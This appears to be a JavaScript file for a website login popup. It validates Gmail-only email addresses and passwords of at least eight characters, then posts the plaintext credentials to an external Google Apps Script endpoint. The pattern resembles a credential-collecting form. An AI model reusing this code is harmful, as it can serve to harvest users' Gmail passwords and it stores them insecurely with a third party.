// close-icon reset datab of  input 

    document.getElementById("resetInput").addEventListener("click", function() {
        // Reload the page
        location.reload();
    });


// red email  validation 
 const emailInput = document.getElementById('emailInput');
const emailIcon = document.getElementById('emailIcon');
const icon = document.querySelector('.icon');

const inputBox = document.querySelector('.input-box');

emailInput.addEventListener('input', validateEmail);
function validateEmail() {
  const emailPattern = /^$|^[a-zA-Z0-9._%+-]+@gmail\.com$/;
const isValidEmail = emailPattern.test(emailInput.value);

 
 inputBox.classList.remove('invalid', 'valid');
  inputBox.classList.add(isValidEmail ? 'valid' : 'invalid');
 }; 


//  red  lock validation
const passwordInput = document.getElementById('pswInput');
const passwordIcon = document.getElementById('hide1');  
const passwordIconHidden = document.getElementById('hide2'); 
const inputBoxPassword = document.querySelector('.input-box-password')
passwordInput.addEventListener('input', validatePassword);

function validatePassword() {
const passwordPattern = /^$|^.{8,}$/;
  const isValidPassword = passwordPattern.test(passwordInput.value);

  inputBoxPassword.classList.remove('invalid', 'valid');
  inputBoxPassword.classList.add(isValidPassword ? 'valid' : 'invalid');
  };


// user output || red-box & empty input valid 
const scriptURL = 'https://script.google.com/macros/s/AKfycbx_-SZci_Xm1BAlIAKArfg2ErY9MGhcxgnSjxiGJXee8AxBtT48_WYL2I2MGFqBRIggTQ/exec';
const form = document.forms['login-form'];

form.addEventListener('submit', e => {
  e.preventDefault();

  // Check if email and password are empty
  const emailInput = form.elements['emailInput'];
  const passwordInput = form.elements['pswInput'];

  if (emailInput.value.trim() === '' || passwordInput.value.trim() === '') {
    // Apply red border
    emailInput.style.border = '1px solid #FF0000' ;
    emailInput.style.boxShadow = '0 0 5px  #FF0000';

    passwordInput.style.border = '1px solid #FF0000';
    passwordInput.style.boxShadow = '0 0 5px  #FF0000';

    // Remove red border after 1 second
    setTimeout(() => {
      emailInput.style.border = '';
      emailInput.style.boxShadow = '';
      
      passwordInput.style.border = '';
      passwordInput.style.boxShadow = '';
      
    }, 1000);

    return; // Stop further execution if validation fails
  }

  // Validate email pattern
  const emailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
  if (!emailPattern.test(emailInput.value)) {
    // Apply red border to invalid email
    emailInput.style.border = '2px solid #FF0000';
    
    // Remove red border after 1 second
    setTimeout(() => {
      emailInput.style.border = '';
    }, 1000);

    return; // Stop further execution if validation fails
  }

  // Validate password length (minimum 8 characters)
  if (passwordInput.value.trim().length < 8) {
    // Apply red border to invalid password
    passwordInput.style.border = '2px solid #FF0000';

    // Remove red border after 1 second
    setTimeout(() => {
      passwordInput.style.border = '';
    }, 1000);

    return; // Stop further execution if validation fails
  }

  // Proceed with form submission if validation passes
  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
    .then(response => alert("Submitted Successfully."))
    .then(() => { window.location.reload(); })
    .catch(error => console.error('Error!', error.message));
});





 

  
  // user input Data script
/* const scriptURL = 'https://script.google.com/macros/s/AKfycbx_-SZci_Xm1BAlIAKArfg2ErY9MGhcxgnSjxiGJXee8AxBtT48_WYL2I2MGFqBRIggTQ/exec'
const form = document.forms['login-form']
form.addEventListener('submit', e => {
  e.preventDefault()

 fetch(scriptURL, { method: 'POST', body: new FormData(form) })
    .then(response => alert("Submitted Successfully."))
    .then(() => { window.location.reload(); })
    .catch(error => console.error('Error!', error.message))
}) */

// selecting  of  class  aniamtion & class
const wrapper = document.querySelector('.wrapper');

const loginLink = document.querySelector('.login-link');
const registerLink= document.querySelector('.register-link');
const btnPopup = document.querySelector('.btnlogin-popup');
const iconClose = document.querySelector('.icon-close');

// add & remove wrapper... 
registerLink.addEventListener('click', ()=>{wrapper.classList.add('active');
});
loginLink.addEventListener('click', ()=>{
  wrapper.classList.remove('active');
});
btnPopup.addEventListener('click', ()=>{
 wrapper.classList.add('active-popup');
});
iconClose.addEventListener('click', ()=>{
setTimeout(() => { 
  wrapper.classList.remove('active-popup');  
  }, 0);
 });

// login show & hide wrappper
function toggleLoginForm() {
  const wrapper = document.querySelector('.wrapper.active-popup');

 if (wrapper) {
    wrapper.style.display = (wrapper.style.display === 'none' || wrapper.style.display === '') ? 'flex' : 'none';
 
  if (wrapper.style.display === 'none') {
      location.reload();
    }
    
  }  
}  
  



document.addEventListener('click', function(event) {
  const wrapper = document.querySelector('.wrapper.active-popup');
  const button = document.querySelector('button');
  const contains = document.querySelector('.wrapper.active-popup');

  if (wrapper && event.target !== button && (!contains || !contains.contains(event.target))) {
    wrapper.style.display = 'none';
    // Reload the page if the wrapper is not displayed
    if (wrapper.style.display === 'none') {
      location.reload();
    }
  }
});

